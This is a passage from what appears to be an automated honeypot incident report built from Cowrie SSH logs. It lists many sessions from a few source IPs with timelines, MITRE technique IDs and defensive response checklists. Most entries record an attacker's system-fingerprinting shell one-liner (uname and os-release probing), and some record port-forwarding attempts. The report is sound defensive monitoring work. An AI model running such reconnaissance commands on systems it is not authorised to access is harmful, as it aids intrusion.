| **Last Seen** | 2026-07-30 01:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:43:57` | `cowrie.session.connect` |
| `2026-07-30 01:43:57` | `cowrie.client.version` |
| `2026-07-30 01:43:57` | `cowrie.client.kex` |
| `2026-07-30 01:43:59` | `cowrie.login.success` |
| `2026-07-30 01:44:00` | `cowrie.session.params` |
| `2026-07-30 01:44:00` | `cowrie.command.input` |
| `2026-07-30 01:44:00` | `cowrie.command.input` |
| `2026-07-30 01:44:00` | `cowrie.command.input` |
| `2026-07-30 01:44:00` | `cowrie.command.input` |
| `2026-07-30 01:44:00` | `cowrie.command.input` |
| `2026-07-30 01:44:00` | `cowrie.command.success` |
| `2026-07-30 01:44:00` | `cowrie.command.input` |
| `2026-07-30 01:44:00` | `cowrie.command.input` |
| `2026-07-30 01:44:00` | `cowrie.command.input` |
| `2026-07-30 01:44:00` | `cowrie.command.input` |
| `2026-07-30 01:44:01` | `cowrie.log.closed` |
| `2026-07-30 01:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8b6fa6a75d3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:45 |
| **Last Seen** | 2026-07-30 01:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:45:25` | `cowrie.session.connect` |
| `2026-07-30 01:45:25` | `cowrie.client.version` |
| `2026-07-30 01:45:25` | `cowrie.client.kex` |
| `2026-07-30 01:45:26` | `cowrie.login.success` |
| `2026-07-30 01:45:27` | `cowrie.session.params` |
| `2026-07-30 01:45:27` | `cowrie.command.input` |
| `2026-07-30 01:45:27` | `cowrie.command.input` |
| `2026-07-30 01:45:27` | `cowrie.command.input` |
| `2026-07-30 01:45:27` | `cowrie.command.input` |
| `2026-07-30 01:45:27` | `cowrie.command.input` |
| `2026-07-30 01:45:27` | `cowrie.command.success` |
| `2026-07-30 01:45:27` | `cowrie.command.input` |
| `2026-07-30 01:45:27` | `cowrie.command.input` |
| `2026-07-30 01:45:27` | `cowrie.command.input` |
| `2026-07-30 01:45:27` | `cowrie.command.input` |
| `2026-07-30 01:45:28` | `cowrie.log.closed` |
| `2026-07-30 01:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16196f54edf2

| Field | Detail |
|---|---|
| **Source IP** | `119.152.102[.]54` |
| **First Seen** | 2026-07-30 01:46 |
| **Last Seen** | 2026-07-30 01:47 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:46:51` | `cowrie.session.connect` |
| `2026-07-30 01:46:52` | `cowrie.client.version` |
| `2026-07-30 01:46:52` | `cowrie.client.kex` |
| `2026-07-30 01:46:54` | `cowrie.login.success` |
| `2026-07-30 01:46:56` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.152.102[.]54` to AbuseIPDB if not already reported
- [ ] Block `119.152.102[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e112c959501a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:46 |
| **Last Seen** | 2026-07-30 01:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:46:52` | `cowrie.session.connect` |
| `2026-07-30 01:46:53` | `cowrie.client.version` |
| `2026-07-30 01:46:53` | `cowrie.client.kex` |
| `2026-07-30 01:46:54` | `cowrie.login.success` |
| `2026-07-30 01:46:55` | `cowrie.session.params` |
| `2026-07-30 01:46:55` | `cowrie.command.input` |
| `2026-07-30 01:46:55` | `cowrie.command.input` |
| `2026-07-30 01:46:55` | `cowrie.command.input` |
| `2026-07-30 01:46:55` | `cowrie.command.input` |
| `2026-07-30 01:46:55` | `cowrie.command.input` |
| `2026-07-30 01:46:55` | `cowrie.command.success` |
| `2026-07-30 01:46:55` | `cowrie.command.input` |
| `2026-07-30 01:46:55` | `cowrie.command.input` |
| `2026-07-30 01:46:55` | `cowrie.command.input` |
| `2026-07-30 01:46:55` | `cowrie.command.input` |
| `2026-07-30 01:46:55` | `cowrie.log.closed` |
| `2026-07-30 01:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ee51644a1a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:48 |
| **Last Seen** | 2026-07-30 01:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:48:19` | `cowrie.session.connect` |
| `2026-07-30 01:48:20` | `cowrie.client.version` |
| `2026-07-30 01:48:20` | `cowrie.client.kex` |
| `2026-07-30 01:48:21` | `cowrie.login.success` |
| `2026-07-30 01:48:22` | `cowrie.session.params` |
| `2026-07-30 01:48:22` | `cowrie.command.input` |
| `2026-07-30 01:48:22` | `cowrie.command.input` |
| `2026-07-30 01:48:22` | `cowrie.command.input` |
| `2026-07-30 01:48:22` | `cowrie.command.input` |
| `2026-07-30 01:48:22` | `cowrie.command.input` |
| `2026-07-30 01:48:22` | `cowrie.command.success` |
| `2026-07-30 01:48:22` | `cowrie.command.input` |
| `2026-07-30 01:48:22` | `cowrie.command.input` |
| `2026-07-30 01:48:22` | `cowrie.command.input` |
| `2026-07-30 01:48:22` | `cowrie.command.input` |
| `2026-07-30 01:48:22` | `cowrie.log.closed` |
| `2026-07-30 01:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58e4c827c8ba

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:49 |
| **Last Seen** | 2026-07-30 01:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:49:52` | `cowrie.session.connect` |
| `2026-07-30 01:49:52` | `cowrie.client.version` |
| `2026-07-30 01:49:52` | `cowrie.client.kex` |
| `2026-07-30 01:49:53` | `cowrie.login.success` |
| `2026-07-30 01:49:54` | `cowrie.session.params` |
| `2026-07-30 01:49:54` | `cowrie.command.input` |
| `2026-07-30 01:49:54` | `cowrie.command.input` |
| `2026-07-30 01:49:54` | `cowrie.command.input` |
| `2026-07-30 01:49:54` | `cowrie.command.input` |
| `2026-07-30 01:49:54` | `cowrie.command.input` |
| `2026-07-30 01:49:54` | `cowrie.command.success` |
| `2026-07-30 01:49:54` | `cowrie.command.input` |
| `2026-07-30 01:49:54` | `cowrie.command.input` |
| `2026-07-30 01:49:54` | `cowrie.command.input` |
| `2026-07-30 01:49:54` | `cowrie.command.input` |
| `2026-07-30 01:49:54` | `cowrie.log.closed` |
| `2026-07-30 01:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9ecabc8b11

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:51 |
| **Last Seen** | 2026-07-30 01:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:51:27` | `cowrie.session.connect` |
| `2026-07-30 01:51:27` | `cowrie.client.version` |
| `2026-07-30 01:51:27` | `cowrie.client.kex` |
| `2026-07-30 01:51:28` | `cowrie.login.success` |
| `2026-07-30 01:51:30` | `cowrie.session.params` |
| `2026-07-30 01:51:30` | `cowrie.command.input` |
| `2026-07-30 01:51:30` | `cowrie.command.input` |
| `2026-07-30 01:51:30` | `cowrie.command.input` |
| `2026-07-30 01:51:30` | `cowrie.command.input` |
| `2026-07-30 01:51:30` | `cowrie.command.input` |
| `2026-07-30 01:51:30` | `cowrie.command.success` |
| `2026-07-30 01:51:30` | `cowrie.command.input` |
| `2026-07-30 01:51:30` | `cowrie.command.input` |
| `2026-07-30 01:51:30` | `cowrie.command.input` |
| `2026-07-30 01:51:30` | `cowrie.command.input` |
| `2026-07-30 01:51:30` | `cowrie.log.closed` |
| `2026-07-30 01:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08a2fb4776fb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:52 |
| **Last Seen** | 2026-07-30 01:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:52:50` | `cowrie.session.connect` |
| `2026-07-30 01:52:50` | `cowrie.client.version` |
| `2026-07-30 01:52:50` | `cowrie.client.kex` |
| `2026-07-30 01:52:52` | `cowrie.login.success` |
| `2026-07-30 01:52:53` | `cowrie.session.params` |
| `2026-07-30 01:52:53` | `cowrie.command.input` |
| `2026-07-30 01:52:53` | `cowrie.command.input` |
| `2026-07-30 01:52:53` | `cowrie.command.input` |
| `2026-07-30 01:52:53` | `cowrie.command.input` |
| `2026-07-30 01:52:53` | `cowrie.command.input` |
| `2026-07-30 01:52:53` | `cowrie.command.success` |
| `2026-07-30 01:52:53` | `cowrie.command.input` |
| `2026-07-30 01:52:53` | `cowrie.command.input` |
| `2026-07-30 01:52:53` | `cowrie.command.input` |
| `2026-07-30 01:52:53` | `cowrie.command.input` |
| `2026-07-30 01:52:53` | `cowrie.log.closed` |
| `2026-07-30 01:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3619838e919e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:54 |
| **Last Seen** | 2026-07-30 01:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:54:12` | `cowrie.session.connect` |
| `2026-07-30 01:54:12` | `cowrie.client.version` |
| `2026-07-30 01:54:12` | `cowrie.client.kex` |
| `2026-07-30 01:54:14` | `cowrie.login.success` |
| `2026-07-30 01:54:15` | `cowrie.session.params` |
| `2026-07-30 01:54:15` | `cowrie.command.input` |
| `2026-07-30 01:54:15` | `cowrie.command.input` |
| `2026-07-30 01:54:15` | `cowrie.command.input` |
| `2026-07-30 01:54:15` | `cowrie.command.input` |
| `2026-07-30 01:54:15` | `cowrie.command.input` |
| `2026-07-30 01:54:15` | `cowrie.command.success` |
| `2026-07-30 01:54:15` | `cowrie.command.input` |
| `2026-07-30 01:54:15` | `cowrie.command.input` |
| `2026-07-30 01:54:15` | `cowrie.command.input` |
| `2026-07-30 01:54:15` | `cowrie.command.input` |
| `2026-07-30 01:54:15` | `cowrie.log.closed` |
| `2026-07-30 01:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec3716bce7b5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:55 |
| **Last Seen** | 2026-07-30 01:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:55:40` | `cowrie.session.connect` |
| `2026-07-30 01:55:40` | `cowrie.client.version` |
| `2026-07-30 01:55:40` | `cowrie.client.kex` |
| `2026-07-30 01:55:42` | `cowrie.login.success` |
| `2026-07-30 01:55:43` | `cowrie.session.params` |
| `2026-07-30 01:55:43` | `cowrie.command.input` |
| `2026-07-30 01:55:43` | `cowrie.command.input` |
| `2026-07-30 01:55:43` | `cowrie.command.input` |
| `2026-07-30 01:55:43` | `cowrie.command.input` |
| `2026-07-30 01:55:43` | `cowrie.command.input` |
| `2026-07-30 01:55:43` | `cowrie.command.success` |
| `2026-07-30 01:55:43` | `cowrie.command.input` |
| `2026-07-30 01:55:43` | `cowrie.command.input` |
| `2026-07-30 01:55:43` | `cowrie.command.input` |
| `2026-07-30 01:55:43` | `cowrie.command.input` |
| `2026-07-30 01:55:44` | `cowrie.log.closed` |
| `2026-07-30 01:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c66b90ab5475

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]253` |
| **First Seen** | 2026-07-30 01:55 |
| **Last Seen** | 2026-07-30 01:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:55:49` | `cowrie.session.connect` |
| `2026-07-30 01:55:50` | `cowrie.client.version` |
| `2026-07-30 01:55:50` | `cowrie.client.kex` |
| `2026-07-30 01:55:52` | `cowrie.login.success` |
| `2026-07-30 01:55:53` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]253` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1994496cf33

| Field | Detail |
|---|---|
| **Source IP** | `222.190.110[.]210` |
| **First Seen** | 2026-07-30 01:55 |
| **Last Seen** | 2026-07-30 01:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:55:58` | `cowrie.session.connect` |
| `2026-07-30 01:55:59` | `cowrie.client.version` |
| `2026-07-30 01:55:59` | `cowrie.client.kex` |
| `2026-07-30 01:56:02` | `cowrie.login.success` |
| `2026-07-30 01:56:05` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.190.110[.]210` to AbuseIPDB if not already reported
- [ ] Block `222.190.110[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa7da19a6f85

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:57 |
| **Last Seen** | 2026-07-30 01:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:57:06` | `cowrie.session.connect` |
| `2026-07-30 01:57:07` | `cowrie.client.version` |
| `2026-07-30 01:57:07` | `cowrie.client.kex` |
| `2026-07-30 01:57:08` | `cowrie.login.success` |
| `2026-07-30 01:57:09` | `cowrie.session.params` |
| `2026-07-30 01:57:09` | `cowrie.command.input` |
| `2026-07-30 01:57:09` | `cowrie.command.input` |
| `2026-07-30 01:57:09` | `cowrie.command.input` |
| `2026-07-30 01:57:09` | `cowrie.command.input` |
| `2026-07-30 01:57:09` | `cowrie.command.input` |
| `2026-07-30 01:57:09` | `cowrie.command.success` |
| `2026-07-30 01:57:09` | `cowrie.command.input` |
| `2026-07-30 01:57:09` | `cowrie.command.input` |
| `2026-07-30 01:57:09` | `cowrie.command.input` |
| `2026-07-30 01:57:09` | `cowrie.command.input` |
| `2026-07-30 01:57:10` | `cowrie.log.closed` |
| `2026-07-30 01:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fb79baf0c43

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:58 |
| **Last Seen** | 2026-07-30 01:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:58:31` | `cowrie.session.connect` |
| `2026-07-30 01:58:31` | `cowrie.client.version` |
| `2026-07-30 01:58:31` | `cowrie.client.kex` |
| `2026-07-30 01:58:33` | `cowrie.login.success` |
| `2026-07-30 01:58:34` | `cowrie.session.params` |
| `2026-07-30 01:58:34` | `cowrie.command.input` |
| `2026-07-30 01:58:34` | `cowrie.command.input` |
| `2026-07-30 01:58:34` | `cowrie.command.input` |
| `2026-07-30 01:58:34` | `cowrie.command.input` |
| `2026-07-30 01:58:34` | `cowrie.command.input` |
